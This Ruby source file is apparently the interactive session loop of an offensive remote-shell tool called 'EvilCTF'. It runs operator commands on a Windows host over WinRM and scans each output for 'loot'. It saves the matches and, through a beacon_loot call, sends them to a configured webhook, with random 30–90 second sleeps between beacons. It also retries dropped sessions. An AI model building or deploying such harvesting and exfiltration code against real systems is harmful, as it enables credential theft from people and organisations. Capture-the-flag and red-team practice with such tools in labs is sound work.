# frozen_string_literal: true

require 'readline'
require 'timeout'

module EvilCTF
  module Session
    module InteractiveLoop
      module_function

      def run(shell:, prompt_cache:, history:, command_manager:, session_options:, logger:, session_logs:)
        should_exit = false

        loop do
          # Check global flag at the top of loop (set by Signal.trap in main)
          last_command_was_tool_upload = false
          if defined?($evil_ctf_should_exit) && $evil_ctf_should_exit
            should_exit = true
          end
          break if should_exit

          begin
            Timeout.timeout(1800) do
              prompt = prompt_cache
              # Use a non-blocking approach for readline to allow interrupt detection
              input = nil

              # Create a thread to read input with timeout
              input_thread = Thread.new do
                begin
                  input = Readline.readline(prompt, true)
                rescue Interrupt
                  # Handle interrupt in the reading thread
                  $evil_ctf_should_exit = true
                  should_exit = true
                  return
                end
              end

              # Wait for input or timeout (with short interval to check exit flag)
              while !input_thread.join(0.1) && !should_exit
                if defined?($evil_ctf_should_exit) && $evil_ctf_should_exit
                  should_exit = true
                  break
                end
              end

              # If thread completed, get the input
              if input_thread.alive?
                input_thread.join
              else
                input = input_thread.value
              end

              # Check exit flag after reading input but before processing
              if defined?($evil_ctf_should_exit) && $evil_ctf_should_exit
                should_exit = true
                next
              end

              break if input.nil?

              input = input.strip
              next if input.empty?

              # Clean exit commands: set flag, let outer loop handle break
              if input =~ /^(exit|quit|__exit__)$/i
                should_exit = true
                next
              end

              history.add(input)

              # --- Session Logging: Log command ---
              LogChannels.append(session_logs[:operator], 'CMD', input)

              # Command dispatch via dispatcher
              dispatch_result = EvilCTF::CommandDispatcher.dispatch(
                name: input,
                args: input.split(/\s+/, 2)[1] || '',
                shell: shell,
                session_options: session_options,
                command_manager: command_manager,
                history: history
              )

              if dispatch_result[:handled]
                # Command was handled by dispatcher
                if dispatch_result[:ok]
                  puts dispatch_result[:output] if dispatch_result[:output] && !dispatch_result[:output].empty?
                  if dispatch_result[:output] && !dispatch_result[:output].empty?
                    LogChannels.append(session_logs[:telemetry], 'DISPATCH_OUT', dispatch_result[:output])
                  end
                elsif dispatch_result[:error]
                  puts "[!] #{dispatch_result[:error]}"
                  LogChannels.append(session_logs[:telemetry], 'DISPATCH_ERR', dispatch_result[:error])
                end
              elsif dispatch_result[:ok]
                # Dispatch returned ok but no output
              else
                # Not handled by dispatcher - use legacy path for macros/aliases
                if command_manager.expand_macro(input, shell,
                                                webhook: session_options[:webhook],
                                                loot_event_logfile: session_logs[:loot])
                  last_command_was_tool_upload = false
                  next
                end

                cmd = command_manager.expand_alias(input)
                start = Time.now
                result = shell.run(cmd)
                elapsed = Time.now - start
                puts result.output
                LogChannels.append(session_logs[:telemetry], 'OUT', result.output)
                unless last_command_was_tool_upload
                  matches = EvilCTF::Tools.grep_output(result.output)
                  if matches.any?
                    EvilCTF::Tools.save_loot(matches, event_logfile: session_logs[:loot])
                    EvilCTF::Tools.beacon_loot(session_options[:webhook], matches) if session_options[:webhook]
                  end
                end
                last_command_was_tool_upload = false

                logger.log_command(cmd, result, elapsed,
                                   '$PID', result.exitcode || 0)
                sleep(rand(30..90)) if session_options[:beacon]
              end
            end
          rescue Timeout::Error
            puts "\n[!] Idle timeout — closing session"
            should_exit = true
          rescue Interrupt
            puts "\n[!] Ctrl-C detected; exiting."
            $evil_ctf_should_exit = true
            should_exit = true
          rescue => e
            # Handle connection errors gracefully
            if e.is_a?(WinRM::WinRMAuthorizationError) || (defined?(Net::HTTPServerException) && e.is_a?(Net::HTTPServerException))
              puts "[!] WARNING - Connection lost: #{e.message}"
              puts '  This may indicate: session timeout, network issues, or firewall changes'
              should_exit = true
            elsif defined?(WinRM::WinRMEndpointError) && e.is_a?(WinRM::WinRMEndpointError)
              puts "[!] WARNING - Connection failed: #{e.message}"
              puts '  This may indicate WinRM service not running or firewall blocking access'
            elsif defined?(WinRM::WinRMAuthenticationError) && e.is_a?(WinRM::WinRMAuthenticationError)
              puts "[!] WARNING - Authentication failed: #{e.message}"
              puts '  Check credentials or Kerberos configuration'
              should_exit = true
            elsif defined?(WinRM::WinRMTransportError) && e.is_a?(WinRM::WinRMTransportError)
              puts "[!] WARNING - Transport error: #{e.message}"
              puts '  Possible SSL/TLS or proxy issues'
            else
              puts "[!] WARNING - Session error: #{e.class}: #{e.message}"
            end

            # Check exit flag in error handler too:
            if defined?($evil_ctf_should_exit) && $evil_ctf_should_exit
              should_exit = true
            end

            # Safe reconnect logic with exit check:
            if session_options[:reconnect_attempts].to_i > 0 && !should_exit
              puts "[*] Attempting to reconnect (#{session_options[:reconnect_attempts]} attempts remaining)..."
              sleep(5)
              session_options[:reconnect_attempts] -= 1
              retry
            end
          end

          break if should_exit # ensure outer loop exits
        end

        should_exit
      end
    end
  end
end
